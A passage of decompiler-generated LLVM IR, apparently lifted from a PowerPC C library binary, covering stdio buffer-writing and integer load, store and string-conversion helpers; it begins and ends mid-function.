  %v2_1001202c = sub i32 %v4_10012024, %v4_1001201c
  br i1 %v3_10012020, label %dec_label_pc_1001202c, label %dec_label_pc_1001205c

dec_label_pc_1001202c:                            ; preds = %dec_label_pc_10012018
  %v3_10012034 = icmp ult i32 %v2_1001202c, %arg2
  br i1 %v3_10012034, label %dec_label_pc_1001203c, label %dec_label_pc_10012040

dec_label_pc_1001203c:                            ; preds = %dec_label_pc_1001202c
  br label %dec_label_pc_10012040

dec_label_pc_10012040:                            ; preds = %dec_label_pc_1001202c, %dec_label_pc_1001203c
  %storemerge = phi i32 [ %v2_1001202c, %dec_label_pc_1001203c ], [ %arg2, %dec_label_pc_1001202c ]
  %v0_10012044 = phi i32 [ %v2_1001202c, %dec_label_pc_1001203c ], [ %arg2, %dec_label_pc_1001202c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10012044, i32* @r5, align 4
  store i32 268509260, i32* @lr, align 4
  %v0_10012048 = call i32 @memcpy()
  %v0_1001204c = load i32, i32* @r30, align 4
  %v1_1001204c = add i32 %v0_1001204c, 16
  %v2_1001204c = inttoptr i32 %v1_1001204c to i32*
  %v3_1001204c = load i32, i32* %v2_1001204c, align 4
  %v1_10012050 = load i32, i32* @r31, align 4
  %v2_10012050 = add i32 %v1_10012050, %v3_1001204c
  store i32 %v2_10012050, i32* %v2_1001204c, align 4
  br label %dec_label_pc_10012144

dec_label_pc_1001205c:                            ; preds = %dec_label_pc_10012018
  %v3_10012060 = icmp ult i32 %v2_1001202c, %arg2
  br i1 %v3_10012060, label %dec_label_pc_10012100, label %dec_label_pc_10012068

dec_label_pc_10012068:                            ; preds = %dec_label_pc_1001205c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268509300, i32* @lr, align 4
  %v0_10012070 = call i32 @memcpy()
  %v0_10012074 = load i32, i32* @r30, align 4
  %v1_10012074 = inttoptr i32 %v0_10012074 to i16*
  %v2_10012074 = load i16, i16* %v1_10012074, align 2
  %v1_10012078 = add i32 %v0_10012074, 16
  %v2_10012078 = inttoptr i32 %v1_10012078 to i32*
  %v3_10012078 = load i32, i32* %v2_10012078, align 4
  %v1_1001207c = and i16 %v2_10012074, 256
  %v3_1001207c = icmp eq i16 %v1_1001207c, 0
  %v1_10012080 = load i32, i32* @r29, align 4
  %v2_10012080 = add i32 %v1_10012080, %v3_10012078
  store i32 %v2_10012080, i32* %v2_10012078, align 4
  br i1 %v3_1001207c, label %dec_label_pc_10012144, label %dec_label_pc_1001208c

dec_label_pc_1001208c:                            ; preds = %dec_label_pc_10012068
  %v0_1001208c = load i32, i32* @r28, align 4
  %v0_10012094 = load i32, i32* @r29, align 4
  store i32 268509340, i32* @lr, align 4
  %v4_10012098 = call i32 @memrchr(i32 %v0_1001208c, i32 10, i32 %v0_10012094, i32 %v2_10012080)
  %v3_1001209c = icmp eq i32 %v4_10012098, 0
  br i1 %v3_1001209c, label %dec_label_pc_10012144, label %dec_label_pc_100120a4

dec_label_pc_100120a4:                            ; preds = %dec_label_pc_1001208c
  %v0_100120a4 = load i32, i32* @r30, align 4
  store i32 %v0_100120a4, i32* @r3, align 4
  store i32 268509356, i32* @lr, align 4
  %v0_100120a8 = call i32 @__stdio_wcommit()
  %v3_100120ac = icmp eq i32 %v0_100120a8, 0
  br i1 %v3_100120ac, label %dec_label_pc_10012144, label %dec_label_pc_100120b4

dec_label_pc_100120b4:                            ; preds = %dec_label_pc_100120a4
  %v0_100120b4 = load i32, i32* @r29, align 4
  %v3_100120b4 = icmp ugt i32 %v0_100120b4, %v0_100120a8
  %v0_100120a8.v0_100120b8 = select i1 %v3_100120b4, i32 %v0_100120a8, i32 %v0_100120b4
  store i32 %v0_100120a8.v0_100120b8, i32* @r31, align 4
  %v2_100120c4 = sub i32 %v0_100120b4, %v0_100120a8.v0_100120b8
  %v0_100120cc = load i32, i32* @r28, align 4
  %v2_100120cc = add i32 %v0_100120cc, %v2_100120c4
  store i32 %v2_100120cc, i32* @r28, align 4
  store i32 %v2_100120cc, i32* @r3, align 4
  store i32 268509404, i32* @lr, align 4
  %v3_100120d8 = call i32 @__GI_memchr(i32 %v2_100120cc, i32 10, i32 %v0_100120a8.v0_100120b8)
  %v3_100120dc = icmp eq i32 %v3_100120d8, 0
  br i1 %v3_100120dc, label %dec_label_pc_10012144, label %dec_label_pc_100120e4

dec_label_pc_100120e4:                            ; preds = %dec_label_pc_100120b4
  %v0_100120e4 = load i32, i32* @r30, align 4
  %v1_100120e4 = add i32 %v0_100120e4, 16
  %v2_100120e4 = inttoptr i32 %v1_100120e4 to i32*
  %v3_100120e4 = load i32, i32* %v2_100120e4, align 4
  %v0_100120e8 = load i32, i32* @r28, align 4
  %v1_100120e8 = load i32, i32* @r31, align 4
  %v2_100120e8 = sub i32 %v0_100120e8, %v3_100120d8
  %v2_100120ec = add i32 %v2_100120e8, %v1_100120e8
  %v2_100120f0 = sub i32 %v3_100120e4, %v2_100120ec
  %v1_100120f4 = load i32, i32* @r29, align 4
  %v2_100120f4 = sub i32 %v1_100120f4, %v2_100120ec
  store i32 %v2_100120f4, i32* @r29, align 4
  store i32 %v2_100120f0, i32* %v2_100120e4, align 4
  br label %dec_label_pc_10012144

dec_label_pc_10012100:                            ; preds = %dec_label_pc_1001205c
  %v2_10012100 = add i32 %tmp, 8
  %v3_10012100 = inttoptr i32 %v2_10012100 to i32*
  %v4_10012100 = load i32, i32* %v3_10012100, align 4
  %v4_10012104 = icmp eq i32 %v4_1001201c, %v4_10012100
  br i1 %v4_10012104, label %dec_label_pc_10012124, label %dec_label_pc_1001210c

dec_label_pc_1001210c:                            ; preds = %dec_label_pc_10012100
  store i32 %tmp, i32* @r3, align 4
  store i32 268509460, i32* @lr, align 4
  %v0_10012110 = call i32 @__stdio_wcommit()
  %v3_10012114 = icmp eq i32 %v0_10012110, 0
  br i1 %v3_10012114, label %dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge, label %dec_label_pc_1001211c

dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge: ; preds = %dec_label_pc_1001210c
  %v0_10012128.pre = load i32, i32* @r30, align 4
  %v0_1001212c.pre = load i32, i32* @r28, align 4
  %v0_10012130.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012124

dec_label_pc_1001211c:                            ; preds = %dec_label_pc_1001210c
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10012144

dec_label_pc_10012124:                            ; preds = %dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge, %entry, %dec_label_pc_10012100
  %v0_10012130 = phi i32 [ %v0_10012130.pre, %dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_10012100 ]
  %v0_1001212c = phi i32 [ %v0_1001212c.pre, %dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_10012100 ]
  %v0_10012128 = phi i32 [ %v0_10012128.pre, %dec_label_pc_1001210c.dec_label_pc_10012124_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_10012100 ]
  %v1_10012128 = inttoptr i32 %v0_10012128 to i16*
  store i32 %v0_10012130, i32* @r5, align 4
  store i32 %v0_10011ff0, i32* @lr, align 4
  %v5_10012140 = call i32 @__stdio_WRITE(i16* %v1_10012128, i32 %v0_1001212c)
  br label %dec_label_pc_10012144

dec_label_pc_10012144:                            ; preds = %dec_label_pc_100120b4, %dec_label_pc_100120a4, %dec_label_pc_1001208c, %dec_label_pc_10012068, %dec_label_pc_1001211c, %dec_label_pc_100120e4, %dec_label_pc_10012040, %dec_label_pc_10012124
  %v0_10012148 = load i32, i32* @r29, align 4
  ret i32 %v0_10012148

; uselistorder directives
  uselistorder i32 %v2_100120ec, { 1, 0 }
  uselistorder i32 %v0_100120a8.v0_100120b8, { 0, 2, 1 }
  uselistorder i32 %v0_100120b4, { 1, 0, 2 }
  uselistorder i32 %v2_1001202c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10012144, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10012124, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012040, { 1, 0 }
}

define i32 @__stdio_trans2w_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1001215c = load i32, i32* @lr, align 4
  store i32 %v0_1001215c, i32* %r0.global-to-local, align 4
  %v0_10012164 = load i32, i32* @r31, align 4
  %v0_10012168 = load i32, i32* @r3, align 4
  store i32 %v0_10012168, i32* @r31, align 4
  %v1_10012170 = inttoptr i32 %v0_10012168 to i16*
  %v2_10012170 = load i16, i16* %v1_10012170, align 2
  %v3_10012170 = zext i16 %v2_10012170 to i32
  store i32 %v3_10012170, i32* %r0.global-to-local, align 4
  %v1_10012174 = load i32, i32* @r4, align 4
  %v2_10012174 = and i32 %v1_10012174, %v3_10012170
  store i32 %v2_10012174, i32* %r9.global-to-local, align 4
  %v5_10012174 = icmp eq i32 %v2_10012174, 0
  br i1 %v5_10012174, label %dec_label_pc_1001217c, label %dec_label_pc_1001218c

dec_label_pc_1001217c:                            ; preds = %entry
  %v1_1001217c = and i32 %v3_10012170, 2176
  store i32 %v1_1001217c, i32* %r9.global-to-local, align 4
  %v3_1001217c = icmp eq i32 %v1_1001217c, 0
  br i1 %v3_1001217c, label %dec_label_pc_10012184, label %dec_label_pc_10012198

dec_label_pc_10012184:                            ; preds = %dec_label_pc_1001217c
  %v2_10012184 = or i32 %v1_10012174, %v3_10012170
  store i32 %v2_10012184, i32* %r0.global-to-local, align 4
  %v1_10012188 = trunc i32 %v2_10012184 to i16
  store i16 %v1_10012188, i16* %v1_10012170, align 2
  %v0_1001218c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001218c

dec_label_pc_1001218c:                            ; preds = %entry, %dec_label_pc_10012184
  %v0_100121c8 = phi i32 [ %v0_10012168, %entry ], [ %v0_1001218c.pre, %dec_label_pc_10012184 ]
  %v1_1001218c = inttoptr i32 %v0_100121c8 to i16*
  %v2_1001218c = load i16, i16* %v1_1001218c, align 2
  %v3_1001218c = zext i16 %v2_1001218c to i32
  %v1_10012190 = and i32 %v3_1001218c, 32
  store i32 %v1_10012190, i32* %r0.global-to-local, align 4
  %v3_10012190 = icmp eq i32 %v1_10012190, 0
  br i1 %v3_10012190, label %dec_label_pc_100121b8, label %dec_label_pc_10012198

dec_label_pc_10012198:                            ; preds = %dec_label_pc_1001217c, %dec_label_pc_1001218c
  %v0_10012198 = call i32 @__errno_location()
  store i32 %v0_10012198, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_100121a0 = inttoptr i32 %v0_10012198 to i32*
  store i32 9, i32* %v2_100121a0, align 4
  br label %dec_label_pc_100121a4

dec_label_pc_100121a4:                            ; preds = %dec_label_pc_100121e0, %dec_label_pc_10012198
  %v0_100121a4 = load i32, i32* @r31, align 4
  %v1_100121a4 = inttoptr i32 %v0_100121a4 to i16*
  %v2_100121a4 = load i16, i16* %v1_100121a4, align 2
  %v3_100121a4 = zext i16 %v2_100121a4 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100121ac = or i32 %v3_100121a4, 8
  store i32 %v1_100121ac, i32* %r0.global-to-local, align 4
  %v1_100121b0 = trunc i32 %v1_100121ac to i16
  store i16 %v1_100121b0, i16* %v1_100121a4, align 2
  br label %dec_label_pc_10012240

dec_label_pc_100121b8:                            ; preds = %dec_label_pc_1001218c
  %tmp = urem i16 %v2_1001218c, 4
  %v1_100121b8 = zext i16 %tmp to i32
  store i32 %v1_100121b8, i32* %r0.global-to-local, align 4
  %v3_100121b8 = icmp eq i16 %tmp, 0
  br i1 %v3_100121b8, label %dec_label_pc_1001221c, label %dec_label_pc_100121c0

dec_label_pc_100121c0:                            ; preds = %dec_label_pc_100121b8
  %v1_100121c0 = and i32 %v3_1001218c, 4
  store i32 %v1_100121c0, i32* %r9.global-to-local, align 4
  %v3_100121c0 = icmp eq i32 %v1_100121c0, 0
  br i1 %v3_100121c0, label %dec_label_pc_100121c8, label %dec_label_pc_10012200

dec_label_pc_100121c8:                            ; preds = %dec_label_pc_100121c0
  %v1_100121c8 = add i32 %v0_100121c8, 20
  %v2_100121c8 = inttoptr i32 %v1_100121c8 to i32*
  %v3_100121c8 = load i32, i32* %v2_100121c8, align 4
  store i32 %v3_100121c8, i32* %r0.global-to-local, align 4
  %v1_100121cc = add i32 %v0_100121c8, 16
  %v2_100121cc = inttoptr i32 %v1_100121cc to i32*
  %v3_100121cc = load i32, i32* %v2_100121cc, align 4
  store i32 %v3_100121cc, i32* %r9.global-to-local, align 4
  %v4_100121d0 = icmp eq i32 %v3_100121c8, %v3_100121cc
  br i1 %v4_100121d0, label %dec_label_pc_100121d8, label %dec_label_pc_100121e0

dec_label_pc_100121d8:                            ; preds = %dec_label_pc_100121c8
  %v1_100121d8 = and i32 %v3_1001218c, 2
  store i32 %v1_100121d8, i32* %r0.global-to-local, align 4
  %v3_100121d8 = icmp eq i32 %v1_100121d8, 0
  br i1 %v3_100121d8, label %dec_label_pc_10012200, label %dec_label_pc_100121e0

dec_label_pc_100121e0:                            ; preds = %dec_label_pc_100121c8, %dec_label_pc_100121d8
  %v1_100121e0 = and i32 %v3_1001218c, 1024
  store i32 %v1_100121e0, i32* %r9.global-to-local, align 4
  %v0_100121e8 = call i32 @__asm_mfcr()
  store i32 %v0_100121e8, i32* %r3.global-to-local, align 4
  %v1_100121ec = call i32 @__asm_rlwinm(i32 %v0_100121e8, i32 3, i32 31, i32 31)
  %v1_100121f0 = sub i32 2, %v1_100121ec
  store i32 %v1_100121f0, i32* @r5, align 4
  store i32 268509688, i32* @lr, align 4
  %v1_100121f4 = call i32 @__GI_fseek(i32 %v1_100121f0)
  store i32 %v1_100121f4, i32* %r3.global-to-local, align 4
  %v3_100121f8 = icmp eq i32 %v1_100121f4, 0
  br i1 %v3_100121f8, label %dec_label_pc_100121e0.dec_label_pc_10012200_crit_edge, label %dec_label_pc_100121a4

dec_label_pc_100121e0.dec_label_pc_10012200_crit_edge: ; preds = %dec_label_pc_100121e0
  %v0_10012200.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012200

dec_label_pc_10012200:                            ; preds = %dec_label_pc_100121e0.dec_label_pc_10012200_crit_edge, %dec_label_pc_100121c0, %dec_label_pc_100121d8
  %v0_10012200 = phi i32 [ %v0_10012200.pre, %dec_label_pc_100121e0.dec_label_pc_10012200_crit_edge ], [ %v0_100121c8, %dec_label_pc_100121c0 ], [ %v0_100121c8, %dec_label_pc_100121d8 ]
  %v1_10012200 = inttoptr i32 %v0_10012200 to i16*
  %v2_10012200 = load i16, i16* %v1_10012200, align 2
  %v3_10012200 = zext i16 %v2_10012200 to i32
  store i32 %v3_10012200, i32* %r0.global-to-local, align 4
  %v1_10012204 = add i32 %v0_10012200, 8
  %v2_10012204 = inttoptr i32 %v1_10012204 to i32*
  %v3_10012204 = load i32, i32* %v2_10012204, align 4
  store i32 %v3_10012204, i32* %r9.global-to-local, align 4
  %v1_10012208 = call i32 @__asm_rlwinm(i32 %v3_10012200, i32 0, i32 0, i32 29)
  %v2_10012208 = trunc i32 %v1_10012208 to i16
  store i32 %v1_10012208, i32* %r0.global-to-local, align 4
  %v3_1001220c = load i32, i32* @r31, align 4
  %v4_1001220c = inttoptr i32 %v3_1001220c to i16*
  store i16 %v2_10012208, i16* %v4_1001220c, align 2
  %v0_10012210 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012210 = load i32, i32* @r31, align 4
  %v2_10012210 = add i32 %v1_10012210, 20
  %v3_10012210 = inttoptr i32 %v2_10012210 to i32*
  store i32 %v0_10012210, i32* %v3_10012210, align 4
  %v0_10012214 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012214 = load i32, i32* @r31, align 4
  %v2_10012214 = add i32 %v1_10012214, 24
  %v3_10012214 = inttoptr i32 %v2_10012214 to i32*
  store i32 %v0_10012214, i32* %v3_10012214, align 4
  %v0_10012218 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012218 = load i32, i32* @r31, align 4
  %v2_10012218 = add i32 %v1_10012218, 16
  %v3_10012218 = inttoptr i32 %v2_10012218 to i32*
  store i32 %v0_10012218, i32* %v3_10012218, align 4
  %v0_1001221c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001221c

dec_label_pc_1001221c:                            ; preds = %dec_label_pc_100121b8, %dec_label_pc_10012200
  %v2_10012228 = phi i32 [ %v0_100121c8, %dec_label_pc_100121b8 ], [ %v0_1001221c.pre, %dec_label_pc_10012200 ]
  %v1_1001221c = inttoptr i32 %v2_10012228 to i16*
  %v2_1001221c = load i16, i16* %v1_1001221c, align 2
  %v3_1001221c = zext i16 %v2_1001221c to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10012224 = or i32 %v3_1001221c, 64
  store i32 %v1_10012224, i32* %r0.global-to-local, align 4
  %v1_10012228 = trunc i32 %v1_10012224 to i16
  store i16 %v1_10012228, i16* %v1_1001221c, align 2
  %v0_1001222c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001222c = urem i32 %v0_1001222c, 65536
  store i32 %v1_1001222c, i32* %r0.global-to-local, align 4
  %v1_10012230 = and i32 %v0_1001222c, 2816
  store i32 %v1_10012230, i32* %r9.global-to-local, align 4
  %v3_10012230 = icmp eq i32 %v1_10012230, 0
  br i1 %v3_10012230, label %dec_label_pc_10012238, label %dec_label_pc_10012240

dec_label_pc_10012238:                            ; preds = %dec_label_pc_1001221c
  %v0_10012238 = load i32, i32* @r31, align 4
  %v1_10012238 = add i32 %v0_10012238, 12
  %v2_10012238 = inttoptr i32 %v1_10012238 to i32*
  %v3_10012238 = load i32, i32* %v2_10012238, align 4
  store i32 %v3_10012238, i32* %r0.global-to-local, align 4
  %v2_1001223c = add i32 %v0_10012238, 28
  %v3_1001223c = inttoptr i32 %v2_1001223c to i32*
  store i32 %v3_10012238, i32* %v3_1001223c, align 4
  br label %dec_label_pc_10012240

dec_label_pc_10012240:                            ; preds = %dec_label_pc_1001221c, %dec_label_pc_100121a4, %dec_label_pc_10012238
  store i32 %v0_1001215c, i32* %r0.global-to-local, align 4
  store i32 %v0_10012164, i32* @r31, align 4
  %v0_10012250 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012250

; uselistorder directives
  uselistorder i32 %v0_1001222c, { 1, 0 }
  uselistorder i32 %v1_10012208, { 1, 0 }
  uselistorder i32 %v0_10012200, { 1, 0 }
  uselistorder i32 %v0_100121c8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v3_10012170, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_10012240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001221c, { 1, 0 }
  uselistorder label %dec_label_pc_10012200, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100121e0, { 1, 0 }
  uselistorder label %dec_label_pc_10012198, { 1, 0 }
  uselistorder label %dec_label_pc_1001218c, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_10012254 = load i32, i32* @r5, align 4
  %v1_10012254 = icmp slt i32 %v0_10012254, 0
  %v1_10012258 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10012294 = icmp eq i32 %v1_10012258, 0
  br i1 %v1_10012254, label %dec_label_pc_10012294, label %dec_label_pc_10012260

dec_label_pc_10012260:                            ; preds = %entry
  br i1 %v3_10012294, label %dec_label_pc_10012268, label %dec_label_pc_1001229c

dec_label_pc_10012268:                            ; preds = %dec_label_pc_10012260
  %v3_10012268 = icmp eq i32 %arg1, 256
  br i1 %v3_10012268, label %dec_label_pc_10012274, label %dec_label_pc_1001227c

dec_label_pc_10012274:                            ; preds = %dec_label_pc_10012268
  br label %dec_label_pc_10012288

dec_label_pc_1001227c:                            ; preds = %dec_label_pc_10012268
  %v3_1001227c = icmp eq i32 %arg1, 512
  br i1 %v3_1001227c, label %dec_label_pc_10012284, label %dec_label_pc_10012288

dec_label_pc_10012284:                            ; preds = %dec_label_pc_1001227c
  br label %dec_label_pc_10012288

dec_label_pc_10012288:                            ; preds = %dec_label_pc_1001227c, %dec_label_pc_10012274, %dec_label_pc_10012284
  ret i32 0

dec_label_pc_10012294:                            ; preds = %entry
  br i1 %v3_10012294, label %dec_label_pc_100122a8, label %dec_label_pc_1001229c

dec_label_pc_1001229c:                            ; preds = %dec_label_pc_10012260, %dec_label_pc_10012294
  %v2_1001229c = load i32, i32* %arg2, align 4
  ret i32 %v2_1001229c

dec_label_pc_100122a8:                            ; preds = %dec_label_pc_10012294
  %v3_100122a8 = icmp eq i32 %arg1, 256
  %v2_100122ac = load i32, i32* %arg2, align 4
  br i1 %v3_100122a8, label %dec_label_pc_100122b4, label %dec_label_pc_100122bc

dec_label_pc_100122b4:                            ; preds = %dec_label_pc_100122a8
  %v1_100122b4 = urem i32 %v2_100122ac, 256
  br label %dec_label_pc_100122c8

dec_label_pc_100122bc:                            ; preds = %dec_label_pc_100122a8
  %v3_100122bc = icmp eq i32 %arg1, 512
  br i1 %v3_100122bc, label %dec_label_pc_100122c4, label %dec_label_pc_100122c8

dec_label_pc_100122c4:                            ; preds = %dec_label_pc_100122bc
  %v1_100122c4 = mul i32 %v2_100122ac, 65536
  %v2_100122c4 = sdiv i32 %v1_100122c4, 65536
  br label %dec_label_pc_100122c8

dec_label_pc_100122c8:                            ; preds = %dec_label_pc_100122bc, %dec_label_pc_100122b4, %dec_label_pc_100122c4
  %v0_100122c8 = phi i32 [ %v2_100122ac, %dec_label_pc_100122bc ], [ %v1_100122b4, %dec_label_pc_100122b4 ], [ %v2_100122c4, %dec_label_pc_100122c4 ]
  %tmp = icmp slt i32 %v0_100122c8, 0
  %v1_100122cc = zext i1 %tmp to i32
  %v2_100122cc = ashr i32 %v0_100122c8, 31
  %v3_100122cc = and i32 %v2_100122cc, -2
  %v4_100122cc = or i32 %v3_100122cc, %v1_100122cc
  ret i32 %v4_100122cc

; uselistorder directives
  uselistorder i32 %v0_100122c8, { 1, 0 }
  uselistorder i32 %v2_100122ac, { 2, 0, 1 }
  uselistorder i1 %v3_10012294, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_100122c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001229c, { 1, 0 }
  uselistorder label %dec_label_pc_10012288, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_100122d4 = load i32, i32* @r4, align 4
  %v3_100122d4 = icmp eq i32 %v0_100122d4, 256
  br i1 %v3_100122d4, label %dec_label_pc_100122e0, label %dec_label_pc_100122e8

dec_label_pc_100122e0:                            ; preds = %entry
  %v0_100122e0 = load i32, i32* @r6, align 4
  %v1_100122e0 = trunc i32 %v0_100122e0 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_100122e0, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_100122e8:                            ; preds = %entry
  %v3_100122d8 = icmp eq i32 %v0_100122d4, 2048
  br i1 %v3_100122d8, label %dec_label_pc_100122f0, label %dec_label_pc_100122fc

dec_label_pc_100122f0:                            ; preds = %dec_label_pc_100122e8
  %v0_100122f0 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_100122f0, i32* %tmp2, align 4
  %v0_100122f4 = load i32, i32* @r6, align 4
  %v3_100122f4 = add i32 %tmp, 4
  %v4_100122f4 = inttoptr i32 %v3_100122f4 to i32*
  store i32 %v0_100122f4, i32* %v4_100122f4, align 4
  ret i32 %tmp

dec_label_pc_100122fc:                            ; preds = %dec_label_pc_100122e8
  %v3_100122e8 = icmp eq i32 %v0_100122d4, 512
  %v0_10012300 = load i32, i32* @r6, align 4
  br i1 %v3_100122e8, label %dec_label_pc_10012300, label %dec_label_pc_10012308

dec_label_pc_10012300:                            ; preds = %dec_label_pc_100122fc
  %v1_10012300 = trunc i32 %v0_10012300 to i16
  store i16 %v1_10012300, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_10012308:                            ; preds = %dec_label_pc_100122fc
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_10012300, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  store i32 %arg4, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10012310 = load i32, i32* %r7.global-to-local, align 4
  %v3_10012310 = icmp eq i32 %v0_10012310, 0
  store i1 %v3_10012310, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_10012310, -1
  br i1 %tmp12, label %dec_label_pc_10012344, label %dec_label_pc_10012324

dec_label_pc_10012324:                            ; preds = %entry
  %v0_10012324 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012328 = sub i32 0, %v0_10012310
  store i32 %v1_10012328, i32* %r7.global-to-local, align 4
  %tmp13 = icmp sgt i32 %v0_10012324, -1
  br i1 %tmp13, label %dec_label_pc_10012344, label %dec_label_pc_10012330

dec_label_pc_10012330:                            ; preds = %dec_label_pc_10012324
  %v0_10012330 = load i32, i32* @r6, align 4
  %v1_10012330 = sub i32 0, %v0_10012330
  %v2_10012330 = sub i32 -1, %v0_10012330
  store i32 %v1_10012330, i32* @r6, align 4
  %v4_10012330 = icmp uge i32 %v2_10012330, %v1_10012330
  %v1_10012334 = sub i32 -1, %v0_10012324
  %v3_10012334 = zext i1 %v4_10012330 to i32
  %v4_10012334 = add i32 %v3_10012334, %v1_10012334
  store i32 %v4_10012334, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012344

dec_label_pc_10012344:                            ; preds = %entry, %dec_label_pc_10012324, %dec_label_pc_10012330
  %v1_10012348 = phi i32 [ %v1_10012328, %dec_label_pc_10012330 ], [ %v1_10012328, %dec_label_pc_10012324 ], [ %v0_10012310, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10012330 ], [ 0, %dec_label_pc_10012324 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_10012348 = udiv i32 -1, %v1_10012348
  store i32 %v2_10012348, i32* %r8.global-to-local, align 4
  %v2_10012350 = load i32, i32* %r3.global-to-local, align 4
  %v3_10012350 = inttoptr i32 %v2_10012350 to i8*
  store i8 0, i8* %v3_10012350, align 1
  %v0_10012354 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012354 = load i32, i32* %r7.global-to-local, align 4
  %v2_10012354 = mul i32 %v1_10012354, %v0_10012354
  %v1_10012358 = sub i32 0, %v2_10012354
  store i32 %v1_10012358, i32* @r31, align 4
  %v4_1001235c = icmp eq i32 %v1_10012354, %v1_10012358
  br i1 %v4_1001235c, label %dec_label_pc_10012364, label %dec_label_pc_1001236c

dec_label_pc_10012364:                            ; preds = %dec_label_pc_10012344
  %v1_10012364 = add i32 %v0_10012354, 1
  store i32 %v1_10012364, i32* %r8.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001236c

dec_label_pc_1001236c:                            ; preds = %dec_label_pc_10012344, %dec_label_pc_10012364
  %v0_1001236c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1001236c, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_10012370

dec_label_pc_10012370thread-pre-split:            ; preds = %dec_label_pc_100123c4
  %v0_10012370.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_10012374.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10012370

dec_label_pc_10012370:                            ; preds = %dec_label_pc_10012370thread-pre-split, %dec_label_pc_1001236c
  %v1_100123b8 = phi i32 [ %v1_10012374.pre, %dec_label_pc_10012370thread-pre-split ], [ %v1_10012354, %dec_label_pc_1001236c ]
  %v1_10012388 = phi i32 [ %v0_10012370.pr, %dec_label_pc_10012370thread-pre-split ], [ %v0_1001236c, %dec_label_pc_1001236c ]
  %v3_10012370 = icmp eq i32 %v1_10012388, 0
  %v0_10012374 = load i32, i32* @r6, align 4
  %v2_10012374 = udiv i32 %v0_10012374, %v1_100123b8
  br i1 %v3_10012370, label %dec_label_pc_100123b8, label %dec_label_pc_1001237c

dec_label_pc_1001237c:                            ; preds = %dec_label_pc_10012370
